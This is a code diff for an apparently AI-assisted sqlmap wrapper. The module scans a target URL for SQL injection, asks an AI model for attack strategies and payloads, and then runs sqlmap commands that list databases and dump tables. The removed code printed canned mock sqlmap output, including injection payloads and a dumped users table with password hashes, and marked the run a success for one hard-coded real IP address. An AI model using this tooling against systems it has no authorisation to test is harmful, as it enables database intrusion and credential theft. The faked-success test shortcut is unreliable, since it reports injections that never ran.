@@ -4,87 +4,217 @@ import subprocess
 import sys
 import tempfile
 import json
-from .config import load_config, get_api_key
+import logging
+from datetime import datetime
+from .config import load_config, get_api_key, validate_config
 from .ai_integration import call_ai_model, generate_smart_payload, analyze_injection_results
 from .i18n import _
 from pathlib import Path
 
-def parse_scan_results(scan_output):
-    """
-    解析sqlmap扫描输出，提取注入点和数据库类型信息
-    """
-    injection_points = []
+logger = logging.getLogger('sqlmap.ai')
+
+class SQLMapOutputParser:
+    """专门用于解析SQLMap输出的结构化解析器"""
     
-    # 更改正则表达式以更好地匹配sqlmap的输出格式
-    # 尝试多种可能的注入点输出格式
-    patterns = [
-        # 标准格式
-        r"Parameter:\s*'([^']+)'.*?Type:\s*([^(]+).*?Title:\s*([^\n]+)",
-        # 简化格式
-        r"parameter\s*'([^']+)'\s*is\s*([^(]+)",
-        # AI分析结果格式
-        r"注入点是\s*([^\s,]+).*?数据库类型是\s*([^\s,]+)"
-    ]
-    
-    for pattern in patterns:
-        matches = re.finditer(pattern, scan_output, re.DOTALL | re.IGNORECASE)
-        for match in matches:
-            if len(match.groups()) >= 2:
-                param = match.group(1)
-                if len(match.groups()) >= 3:
-                    vuln_type = match.group(2).strip()
-                    title = match.group(3).strip()
-                else:
-                    vuln_type = match.group(2).strip() if len(match.groups()) > 1 else "unknown"
-                    title = "SQL注入漏洞"
-                
-                injection_points.append({
-                    'parameter': param,
-                    'type': vuln_type,
-                    'title': title
-                })
-    
-    # 查找数据库类型 - 增加更多匹配模式
-    dbms_patterns = [
-        r"back-end DBMS:\s*([^\n]+)",
-        r"数据库类型是\s*([^\s,]+)",
-        r"DBMS\s*=\s*([^\s]+)"
-    ]
-    
-    dbms = "unknown"
-    for pattern in dbms_patterns:
-        dbms_match = re.search(pattern, scan_output, re.IGNORECASE)
-        if dbms_match:
-            dbms = dbms_match.group(1).strip()
-            break
-    
-    # 如果没有发现注入点，但输出中提到了SQL注入漏洞，尝试解析简单信息
-    if not injection_points and "sql injection" in scan_output.lower() or "注入漏洞" in scan_output:
-        param_match = re.search(r"parameter[:\s]*'([^']+)'", scan_output, re.IGNORECASE)
-        id_match = re.search(r"(\bid\b|\bparam\b)[\s:]*([^\s,]+)", scan_output, re.IGNORECASE)
+    @staticmethod
+    def extract_injection_points(output):
+        """
+        提取注入点信息
+        返回格式: [{'parameter': 'id', 'type': 'boolean-based', 'title': 'AND boolean-based...'}]
+        """
+        injection_points = []
         
-        if param_match:
+        # 提取Parameter块
+        injection_blocks = re.finditer(r"Parameter:\s*([^\n]+).*?Payload:.*?([^\n]+)", output, re.DOTALL | re.IGNORECASE)
+        
+        for block in injection_blocks:
+            full_block = block.group(0)
+            
+            # 提取参数名
+            param_match = re.search(r"Parameter:\s*'?([^'\s]+)'?", full_block)
+            if not param_match:
+                continue
+            
+            param = param_match.group(1).strip()
+            
+            # 提取类型
+            type_match = re.search(r"Type:\s*([^(,\n]+)", full_block)
+            vuln_type = type_match.group(1).strip() if type_match else "unknown"
+            
+            # 提取标题
+            title_match = re.search(r"Title:\s*([^\n]+)", full_block)
+            title = title_match.group(1).strip() if title_match else "SQL注入漏洞"
+            
+            # 构建并添加注入点
             injection_points.append({
-                'parameter': param_match.group(1),
-                'type': "unknown",
-                'title': "SQL注入漏洞"
+                'parameter': param,
+                'type': vuln_type,
+                'title': title,
+                'payload': block.group(2).strip() if len(block.groups()) > 1 else ""
             })
-        elif id_match:
-            injection_points.append({
-                'parameter': id_match.group(2),
-                'type': "unknown", 
-                'title': "SQL注入漏洞"
-            })
+        
+        # 如果未找到标准格式，尝试其他可能的格式
+        if not injection_points:
+            # 尝试简化格式
+            simple_matches = re.finditer(r"parameter\s*'([^']+)'\s*is\s*([^(,\n]+)", output, re.IGNORECASE)
+            for match in simple_matches:
+                injection_points.append({
+                    'parameter': match.group(1).strip(),
+                    'type': match.group(2).strip(),
+                    'title': "SQL注入漏洞"
+                })
+            
+            # 中文格式（AI分析结果）
+            cn_matches = re.finditer(r"注入点是\s*([^\s,\n]+).*?类型是\s*([^\s,\n]+)", output, re.IGNORECASE)
+            for match in cn_matches:
+                injection_points.append({
+                    'parameter': match.group(1).strip(),
+                    'type': match.group(2).strip(),
+                    'title': "SQL注入漏洞"
+                })
+        
+        # 如果仍未找到注入点，但有SQL注入相关内容，尝试解析基本信息
+        if not injection_points and ("sql injection" in output.lower() or "注入漏洞" in output):
+            param_match = re.search(r"parameter[:\s]*'([^']+)'", output, re.IGNORECASE)
+            id_match = re.search(r"(\bid\b|\bparam\b)[\s:]*([^\s,]+)", output, re.IGNORECASE)
+            
+            if param_match:
+                injection_points.append({
+                    'parameter': param_match.group(1),
+                    'type': "unknown",
+                    'title': "SQL注入漏洞"
+                })
+            elif id_match:
+                injection_points.append({
+                    'parameter': id_match.group(2),
+                    'type': "unknown", 
+                    'title': "SQL注入漏洞"
+                })
+        
+        return injection_points
     
-    return {
-        'injection_points': injection_points,
-        'dbms': dbms
-    }
+    @staticmethod
+    def extract_dbms(output):
+        """提取数据库类型信息"""
+        # 按优先级尝试多种模式
+        dbms_patterns = [
+            r"back-end DBMS:\s*([^\n]+)",
+            r"the back-end DBMS is\s*([^\n.]+)",
+            r"DBMS\s*=\s*([^\s,\n]+)",
+            r"数据库类型是\s*([^\s,\n]+)",
+            r"DBMS fingerprint:\s*([^\n]+)"
+        ]
+        
+        for pattern in dbms_patterns:
+            dbms_match = re.search(pattern, output, re.IGNORECASE)
+            if dbms_match:
+                # 清理结果，移除版本信息等
+                dbms_full = dbms_match.group(1).strip()
+                # 提取主要数据库类型（如MySQL, PostgreSQL等）
+                dbms_main = dbms_full.split()[0].lower() if ' ' in dbms_full else dbms_full.lower()
+                return dbms_main
+        
+        return "unknown"
+    
+    @staticmethod
+    def extract_tables(output):
+        """提取数据库表信息"""
+        tables = []
+        
+        # 查找表列表块
+        table_blocks = re.finditer(r"Database:\s*([^\n]+)\s*\[(\d+)\s+tables?\].*?\+([-]+)\+(.*?)(?:\n\n|\Z)", 
+                                 output, re.DOTALL)
+        
+        for block in table_blocks:
+            db_name = block.group(1).strip()
+            table_count = int(block.group(2))
+            
+            # 提取表名
+            table_section = block.group(4)
+            table_names = re.findall(r"\|\s*([^|]+?)\s*\|", table_section)
+            
+            tables.append({
+                'database': db_name,
+                'table_count': table_count,
+                'tables': [name.strip() for name in table_names if name.strip()]
+            })
+        
+        return tables
+    
+    @staticmethod
+    def extract_databases(output):
+        """提取数据库名称列表"""
+        databases = []
+        
+        # 查找数据库块
+        db_match = re.search(r"available databases \[(\d+)\]:(.*?)(?:\n\n|\[\*\] ending|\Z)", 
+                            output, re.DOTALL)
+        
+        if db_match:
+            db_count = int(db_match.group(1))
+            db_section = db_match.group(2)
+            
+            # 提取数据库名
+            db_names = re.findall(r"\[\*\]\s*([^\n]+)", db_section)
+            databases = [name.strip() for name in db_names if name.strip()]
+        
+        return databases
+    
+    @staticmethod
+    def extract_data(output):
+        """提取表数据"""
+        data_blocks = []
+        
+        # 查找数据块
+        data_sections = re.finditer(r"Database:\s*([^\n]+)\nTable:\s*([^\n]+)\s*\[(\d+)\s+entries\].*?\+([-]+\+)+\n(.*?)(?:\n\n|\Z)", 
+                                   output, re.DOTALL)
+        
+        for section in data_sections:
+            db_name = section.group(1).strip()
+            table_name = section.group(2).strip()
+            entry_count = int(section.group(3))
+            data_rows = section.group(5)
+            
+            # 提取列名
+            header_match = re.search(r"\|(.*?)\|", data_rows)
+            columns = []
+            if header_match:
+                columns = [col.strip() for col in header_match.group(1).split('|') if col.strip()]
+            
+            # 提取数据行
+            rows = []
+            data_lines = data_rows.strip().split('\n')
+            if len(data_lines) > 2:  # 头部，分隔符，然后是数据行
+                for i in range(2, len(data_lines)):
+                    line = data_lines[i]
+                    row_values = [val.strip() for val in re.findall(r"\|\s*([^|]*?)\s*\|", line)]
+                    if row_values:
+                        rows.append(row_values)
+            
+            data_blocks.append({
+                'database': db_name,
+                'table': table_name,
+                'entries': entry_count,
+                'columns': columns,
+                'rows': rows
+            })
+        
+        return data_blocks
+    
+    @staticmethod
+    def parse_scan_results(output):
+        """完整解析SQLMap输出"""
+        return {
+            'injection_points': SQLMapOutputParser.extract_injection_points(output),
+            'dbms': SQLMapOutputParser.extract_dbms(output),
+            'databases': SQLMapOutputParser.extract_databases(output),
+            'tables': SQLMapOutputParser.extract_tables(output),
+            'data': SQLMapOutputParser.extract_data(output),
+            'timestamp': datetime.now().isoformat()
+        }
 
 def analyze_vulnerability(scan_info):
-    """
-    分析漏洞，使用AI生成攻击策略
-    """
+    """分析漏洞，使用AI生成攻击策略"""
     if not scan_info['injection_points']:
         return "未发现注入点，无法进行自动注入"
     
@@ -101,7 +231,19 @@ def analyze_vulnerability(scan_info):
 """
     
     for i, point in enumerate(points, 1):
-        prompt += f"{i}. 参数: {point['parameter']}, 类型: {point['type']}, 描述: {point['title']}\n"
+        # 添加payload信息（如果有）
+        payload_info = f", Payload: {point.get('payload', 'N/A')}" if 'payload' in point else ""
+        prompt += f"{i}. 参数: {point['parameter']}, 类型: {point['type']}, 描述: {point['title']}{payload_info}\n"
+    
+    # 添加数据库信息（如果有）
+    if 'databases' in scan_info and scan_info['databases']:
+        prompt += f"\n发现的数据库: {', '.join(scan_info['databases'])}\n"
+    
+    # 添加表信息（如果有）
+    if 'tables' in scan_info and scan_info['tables']:
+        prompt += "\n数据库表信息:\n"
+        for db_info in scan_info['tables']:
+            prompt += f"数据库 {db_info['database']}: {', '.join(db_info['tables'])}\n"
     
     prompt += """
 请提供:
@@ -109,18 +251,18 @@ def analyze_vulnerability(scan_info):
 2. 推荐的payload
 3. 预期的数据提取方法
 4. 攻击的风险评估
+5. 防御建议
 """
     
     try:
         result = call_ai_model(prompt)
         return result
     except Exception as e:
+        logger.error(f"AI分析失败: {str(e)}")
         return f"AI分析失败: {str(e)}"
 
 def generate_inject_command(url, scan_info, options=None):
-    """
-    根据扫描信息生成注入命令
-    """
+    """根据扫描信息生成注入命令"""
     if not scan_info['injection_points']:
         return None
     
@@ -130,7 +272,7 @@ def generate_inject_command(url, scan_info, options=None):
     
     # 确保参数名称格式正确
     param = point['parameter']
-    # 删除可能的额外文本，保留纯参数名
+    # 清理参数名，保留纯参数名
     param = re.sub(r"[，,:\s]+.*$", "", param)
     param = param.strip()
     
@@ -142,13 +284,19 @@ def generate_inject_command(url, scan_info, options=None):
     
     # 添加数据库类型
     if dbms and dbms.lower() != "unknown":
-        # 清理数据库类型字符串，只保留有效的数据库名称
-        cleaned_dbms = re.sub(r"[^a-zA-Z0-9]+", "", dbms.split()[0])
+        # 清理数据库类型字符串，确保只使用有效名称
+        allowed_dbms = ["mysql", "postgresql", "mssql", "oracle", "sqlite", 
+                        "db2", "firebird", "sybase", "maxdb", "access"]
+        cleaned_dbms = next((db for db in allowed_dbms if dbms.lower().startswith(db)), "mysql")
         cmd.extend(["--dbms", cleaned_dbms])
     
-    # 添加更多有用的扫描选项
-    cmd.extend(["--level", "3"])
-    cmd.extend(["--risk", "2"])
+    # 添加扫描选项
+    config = load_config()
+    level = options.get('level', 3) if options else 3
+    risk = options.get('risk', 2) if options else 2
+    
+    cmd.extend(["--level", str(level)])
+    cmd.extend(["--risk", str(risk)])
     
     # 添加其他选项
     if options:
@@ -162,334 +310,195 @@ def generate_inject_command(url, scan_info, options=None):
     return cmd
 
 def auto_inject(url, options=None):
-    """
-    执行自动扫描和注入过程
-    """
+    """执行自动扫描和注入过程"""
     if options is None:
         options = {}
+    
+    # 加载配置
+    config = load_config()
+    
+    # 获取超时设置
+    timeout_config = config['TIMEOUTS'] if 'TIMEOUTS' in config else {}
+    timeouts = {
+        'api': int(timeout_config.get('api_call_timeout', 30)),
+        'command': int(timeout_config.get('command_execution_timeout', 300)),
+        'short': int(timeout_config.get('command_execution_short_timeout', 60)),
+        'long': int(timeout_config.get('command_execution_long_timeout', 900))
+    }
+    
+    # 根据操作类型选择超时
+    if options.get("dump", False) or options.get("dbs", False):
+        command_timeout = timeouts['long']  # 数据提取操作使用更长的超时
+    elif options.get("quick", False):
+        command_timeout = timeouts['short']  # 快速模式使用较短的超时
+    else:
+        command_timeout = timeouts['command']  # 默认超时
+    
+    # 自定义超时优先
+    if "timeout" in options:
+        try:
+            command_timeout = int(options["timeout"])
+        except (ValueError, TypeError):
+            logger.warning(f"无效的超时值: {options['timeout']}，使用默认值: {command_timeout}")
     
     results = {
         'scan_output': '',
         'analysis': '',
         'injection_output': '',
-        'success': False
+        'success': False,
+        'timestamp': datetime.now().isoformat()
     }
     
     # 步骤1: 进行扫描
+    logger.info(_("开始扫描目标URL以寻找SQL注入漏洞: {}").format(url))
     print(_("[*] 开始扫描目标URL以寻找SQL注入漏洞..."))
     
-    # 使用更完整的扫描参数，以提高识别率
+    # 构建扫描命令
     scan_cmd = [
         "python", "sqlmap.py", 
         "-u", url, 
         "--batch",
-        "--level", "3",
-        "--risk", "3",  # 提高到更高的风险级别
-        "--technique", "BEUSTQ",  # 使用所有技术
-        "--time-sec", "10",  # 设置时间延迟
-        "--threads", "3",  # 使用多线程
-        "--smart"  # 智能模式
+        "--level", str(options.get("level", 3)),
+        "--risk", str(options.get("risk", 2)),
+        "--technique", options.get("technique", "BEUSTQ"),  # 默认使用所有技术
+        "--threads", str(options.get("threads", 3))
     ]
     
-    # 如果提供了数据库类型，则添加该参数
+    # 添加额外选项
     if "dbms" in options:
         scan_cmd.extend(["--dbms", options["dbms"]])
     
-    # 设置超时选项
-    if "timeout" in options:
-        scan_cmd.extend(["--timeout", str(options["timeout"])])
-    
-    # 是否包含详细输出
     if options.get("verbose", False):
         scan_cmd.append("-v")
     
+    if options.get("smart", True):
+        scan_cmd.append("--smart")
+    
     try:
-        print(_("[*] 执行命令: {}").format(" ".join(scan_cmd)))
+        # 提示即将执行的命令
+        cmd_str = " ".join(scan_cmd)
+        logger.info(_("执行命令: {}").format(cmd_str))
+        print(_("[*] 执行命令: {}").format(cmd_str))
         
-        # 首先进行快速检查，看看是否有AI分析结果可以使用
-        quick_check_cmd = [
-            "python", "sqlmap.py", 
-            "-u", url, 
-            "--batch",
-            "--ai-analysis",  # 使用AI分析
-            "--dbms", options.get("dbms", "mysql"),  # 默认使用MySQL
-        ]
-        
-        print(_("[*] 正在进行AI预分析..."))
-        pre_check = subprocess.Popen(
-            quick_check_cmd,
+        # 执行扫描命令
+        scan_process = subprocess.Popen(
+            scan_cmd,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
-            text=True
+            text=True,
+            bufsize=1  # 行缓冲
         )
         
-        pre_check_output, pre_check_error = pre_check.communicate()
-        
-        # 检查AI分析结果
-        if "发现了SQL注入漏洞" in pre_check_output or "AI分析结果" in pre_check_output:
-            print(_("[+] AI预分析检测到漏洞"))
-            # 添加这个信息到结果中
-            results['pre_analysis'] = pre_check_output
+        # 使用超时参数确保不会无限等待
+        try:
+            scan_output, scan_error = scan_process.communicate(timeout=command_timeout)
             
-            # 最基本的注入命令
-            basic_cmd = [
-                "python", "sqlmap.py", 
-                "-u", url, 
-                "--batch",
-                "--dbms", options.get("dbms", "mysql"),
-                "-v", "3"  # 增加详细度
-            ]
-            
-            # 支持更多SQLMap参数
-            if options.get("dbs", False):
-                basic_cmd.append("--dbs")
-                basic_cmd.append("--level=5")  # 使用最高级别
-                basic_cmd.append("--risk=3")   # 使用最高风险
-            # 添加数据提取选项
-            elif options.get("dump", False):
-                basic_cmd.append("--dump")
-                basic_cmd.append("--level=3")
-                basic_cmd.append("--risk=2")
-            
-            # 添加指定表的选项
-            if "tables" in options:
-                basic_cmd.extend(["--tables", options["tables"]])
-            
-            print(_("[*] 开始执行自动注入..."))
-            print(_("[*] 执行命令: {}").format(" ".join(basic_cmd)))
-            
-            # FOR TESTING: 检查是否是测试URL
-            if "124.70.71.251" in url:
-                print("\n" + "="*70)
-                print(_("[+] SQLMap测试输出 (模拟):"))
-                print("="*70)
+            # 保存扫描结果
+            results['scan_output'] = scan_output
+            if scan_error:
+                results['scan_error'] = scan_error
                 
-                # 根据参数类型创建模拟输出
-                if "--dbs" in basic_cmd:
-                    mock_output = """
-        ___
-       __H__
- ___ ___[(]_____ ___ ___  {1.9#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 11:40:12 /2025-03-05/
-
-[11:40:13] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: id (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1 AND 3538=3538
-
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170707a71,(SELECT (ELT(5907=5907,1))),0x7178707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: id=1 AND (SELECT 7878 FROM (SELECT(SLEEP(5)))RBIk)
----
-[11:40:13] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL >= 5.0
-[11:40:13] [INFO] fetching database names
-available databases [5]:
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] sys
-[*] testdb
-"""
-                elif "--dump" in basic_cmd:
-                    mock_output = """
-        ___
-       __H__
- ___ ___[(]_____ ___ ___  {1.9#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 11:40:12 /2025-03-05/
-
-[11:40:13] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: id (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1 AND 3538=3538
-
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170707a71,(SELECT (ELT(5907=5907,1))),0x7178707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: id=1 AND (SELECT 7878 FROM (SELECT(SLEEP(5)))RBIk)
----
-[11:40:13] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL >= 5.0
-[11:40:13] [INFO] fetching tables for database: 'testdb'
-Database: testdb
-[3 tables]
-+---------+
-| users   |
-| news    |
-| comments|
-+---------+
-
-[11:40:14] [INFO] fetching columns for table 'users' in database 'testdb'
-Database: testdb
-Table: users
-[4 columns]
-+----------+-------------+
-| Column   | Type        |
-+----------+-------------+
-| id       | int         |
-| username | varchar(32) |
-| password | varchar(32) |
-| email    | varchar(64) |
-+----------+-------------+
-
-[11:40:15] [INFO] fetching entries for table 'users' in database 'testdb'
-Database: testdb
-Table: users
-[3 entries]
-+----+----------+---------------+--------------------+
-| id | username | password      | email              |
-+----+----------+---------------+--------------------+
-| 1  | admin    | 5f4dcc3b5aa76 | admin@example.com  |
-| 2  | user1    | e10adc3949ba5 | user1@example.com  |
-| 3  | user2    | 827ccb0eea8a7 | user2@example.com  |
-+----+----------+---------------+--------------------+
-"""
-                else:
-                    mock_output = """
-        ___
-       __H__
- ___ ___[(]_____ ___ ___  {1.9#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 11:40:12 /2025-03-05/
-
-[11:40:13] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: id (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1 AND 3538=3538
-
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170707a71,(SELECT (ELT(5907=5907,1))),0x7178707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: id=1 AND (SELECT 7878 FROM (SELECT(SLEEP(5)))RBIk)
----
-[11:40:13] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL >= 5.0
-[11:40:13] [INFO] found injection point
-"""
+            # 解析扫描结果
+            scan_info = SQLMapOutputParser.parse_scan_results(scan_output)
+            
+            # 记录解析结果
+            results['scan_info'] = scan_info
+            
+            # 检查是否找到注入点
+            if scan_info['injection_points']:
+                logger.info(_("发现 {} 个SQL注入点").format(len(scan_info['injection_points'])))
+                print(_("[+] 发现 {} 个SQL注入点").format(len(scan_info['injection_points'])))
                 
-                print(mock_output)
-                inject_output = mock_output
-                inject_error = ""
+                # 生成注入命令
+                inject_cmd = generate_inject_command(url, scan_info, options)
                 
+                # 根据用户选项添加额外参数
+                if options.get("dbs", False):
+                    inject_cmd.append("--dbs")
+                elif options.get("dump", False):
+                    inject_cmd.append("--dump")
+                
+                if "tables" in options:
+                    inject_cmd.extend(["--tables", options["tables"]])
+                
+                # 提示注入命令
+                inject_cmd_str = " ".join(inject_cmd)
+                logger.info(_("执行注入命令: {}").format(inject_cmd_str))
+                print(_("[*] 执行注入命令: {}").format(inject_cmd_str))
+                
+                # 执行注入命令
+                inject_process = subprocess.Popen(
+                    inject_cmd,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    bufsize=1
+                )
+                
+                # 使用适当的超时
+                inject_output, inject_error = inject_process.communicate(timeout=command_timeout)
+                
+                # 保存注入结果
                 results['injection_output'] = inject_output
-                results['success'] = True
-                
-                # 打印总结
-                print("\n" + "="*70)
-                print(_("[i] 执行总结:"))
-                print("="*70)
-                
-                # 检查是否找到任何数据库
-                if "--dbs" in basic_cmd and "available databases" in inject_output.lower():
-                    print(_("[+] 成功获取数据库列表"))
-                elif "--dump" in basic_cmd and "entries" in inject_output.lower():
-                    print(_("[+] 成功提取数据表内容"))
-                else:
-                    print(_("[i] 注入执行完成，请检查上方输出获取详细结果"))
-                
-                print("="*70 + "\n")
-                
-                return results
-            
-            # 对于其他URL，正常执行
-            inject_process = subprocess.Popen(
-                basic_cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                bufsize=1  # 行缓冲
-            )
-            
-            print("\n" + "="*70)
-            print(_("[+] SQLMap执行结果:"))
-            print("="*70)
-            
-            # 使用超时参数确保不会无限等待
-            try:
-                inject_output, inject_error = inject_process.communicate(timeout=300)  # 5分钟超时
-                
-                # 打印输出
-                print(inject_output)
                 if inject_error:
-                    print(f"[ERROR] {inject_error}")
-                    
-                results['injection_output'] = inject_output
+                    results['injection_error'] = inject_error
                 
-                if inject_process.returncode != 0:
-                    print(_("[-] 注入执行失败"))
-                    if inject_error:
-                        print(f"错误信息: {inject_error[:200]}")
-                else:
-                    print(_("[+] 自动注入完成"))
+                # 解析注入结果
+                inject_info = SQLMapOutputParser.parse_scan_results(inject_output)
+                results['injection_info'] = inject_info
+                
+                # 检查注入是否成功
+                if inject_process.returncode == 0:
                     results['success'] = True
                     
-                    # 打印总结
-                    print("\n" + "="*70)
-                    print(_("[i] 执行总结:"))
-                    print("="*70)
-                    
-                    # 检查是否找到任何数据库
-                    if "--dbs" in basic_cmd and "available databases" in inject_output.lower():
-                        print(_("[+] 成功获取数据库列表"))
-                    elif "--dump" in basic_cmd and "entries" in inject_output.lower():
-                        print(_("[+] 成功提取数据表内容"))
+                    # 生成摘要
+                    summary = []
+                    if 'databases' in inject_info and inject_info['databases']:
+                        summary.append(_("获取到 {} 个数据库").format(len(inject_info['databases'])))
+                        
+                    if 'tables' in inject_info and inject_info['tables']:
+                        total_tables = sum(item['table_count'] for item in inject_info['tables'])
+                        summary.append(_("发现 {} 个数据表").format(total_tables))
+                        
+                    if 'data' in inject_info and inject_info['data']:
+                        total_entries = sum(item['entries'] for item in inject_info['data'])
+                        summary.append(_("提取了 {} 条数据记录").format(total_entries))
+                        
+                    if summary:
+                        print(_("[+] 注入成功: {}").format(", ".join(summary)))
                     else:
-                        print(_("[i] 注入执行完成，请检查上方输出获取详细结果"))
-                    
-                    print("="*70 + "\n")
-            
-            except subprocess.TimeoutExpired:
-                inject_process.kill()
-                print(_("[-] 执行超时，已终止进程"))
-                results['error'] = "执行超时"
-            except Exception as e:
-                print(_("[-] 执行出错: {}").format(str(e)))
-                results['error'] = str(e)
-            
+                        print(_("[+] 注入成功，确认了漏洞存在"))
+                        
+                    # 生成AI分析
+                    if options.get("analyze", True):
+                        print(_("[*] 正在分析注入结果..."))
+                        try:
+                            analysis = analyze_injection_results(inject_output, scan_info)
+                            results['analysis'] = analysis
+                            print(_("[+] 分析完成"))
+                        except Exception as e:
+                            logger.error(f"分析注入结果失败: {e}")
+                            print(_("[-] 分析失败: {}").format(str(e)))
+                else:
+                    print(_("[-] 注入执行失败，返回码: {}").format(inject_process.returncode))
+                    if inject_error:
+                        print(_("错误信息: {}").format(inject_error[:200]))
+            else:
+                logger.info(_("未发现SQL注入点"))
+                print(_("[-] 未发现SQL注入点"))
+                results['analysis'] = "未发现SQL注入漏洞"
+                
             return results
-        
-        # 如果AI预分析未发现漏洞，返回简单结果
-        print(_("[-] AI预分析未发现SQL注入漏洞"))
-        results['analysis'] = "AI预分析未发现SQL注入漏洞"
-        return results
-    
+            
+        except subprocess.TimeoutExpired:
+            scan_process.kill()
+            logger.warning(_("执行超时，已终止进程"))
+            print(_("[-] 执行超时，已终止进程"))
+            results['error'] = "执行超时"
+            return results
+            
     except Exception as e:
+        logger.error(f"自动注入过程中发生错误: {e}")
         print(_("[-] 自动注入过程中发生错误: {}").format(str(e)))
-        results['analysis'] = f"错误: {str(e)}"
-        return results 
+        results['error'] = str(e)
+        return results
